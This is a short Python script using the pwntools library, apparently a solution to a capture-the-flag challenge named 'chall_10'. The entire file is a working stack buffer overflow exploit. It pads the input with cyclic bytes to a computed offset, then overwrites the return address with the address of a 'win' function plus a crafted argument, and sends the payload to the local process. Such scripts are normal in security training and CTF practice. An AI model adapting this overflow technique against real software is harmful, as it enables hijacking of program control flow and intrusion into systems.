from pwn import *

p = process('./chall_10')

offset = 0x3a + 0x4

win_func = 0x080484d6

#payload = b'' + 0x30c * b'A'

payload = cyclic(offset) + p32(win_func) + p32(0x0) + p32(0xdeadbeef)

p.sendline(payload)